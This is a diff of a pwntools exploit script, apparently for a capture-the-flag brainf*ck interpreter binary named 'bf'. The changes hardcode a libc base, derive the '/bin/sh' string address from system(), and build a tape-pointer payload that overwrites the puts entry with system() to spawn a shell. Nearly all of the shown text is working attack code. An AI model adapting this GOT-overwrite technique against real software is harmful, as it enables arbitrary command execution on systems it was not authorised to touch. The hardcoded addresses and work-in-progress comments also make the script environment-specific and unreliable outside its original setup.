@@ -10,13 +10,15 @@ exe = ELF("./bf")
 
 # Libc
 libc = exe.libc
-sh_addr = p32(next(libc.search(b"/bin/sh")))
+libc_base = 0xf7e0a000
+libc.address = libc_base
 puts_addr = p32(next(libc.search(b"puts")))
 #execve_addr = p32(next(libc.search(b"libc_system")))
 system_addr = libc.symbols["system"]
+sh_addr = system_addr + 0x120d7b
 puts_addr = libc.symbols["puts"]
 puts_plt = p32(exe.plt['puts'])
-#print(f"system_add: {system_addr}")
+print(f"sh_addr: {hex(sh_addr)}")
 #print(f"puts plt: {puts_plt}")
 
 # Start process
@@ -29,6 +31,7 @@ with open("payload", "w") as f:
 payload = ""
 payload += "<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
 payload += ",>,>,>," # putchar - for sending the last char
+payload += ".BBBB"*100 # call to puts()
 payload += "[" # call to puts()
 payload +="\n"
 conn.send(payload)
@@ -37,7 +40,7 @@ with open("payload", "w+") as f:
     f.write(payload)
 # separate sends cuz of annoying encoding / decoding issue with p32() and
 # strings
-payload = p32(0xf7e55db0)
+payload = p32(0xf7e55db0) # system()
 payload +=b"\n"
 conn.send(payload)
 with open("payload", "ab+") as f:
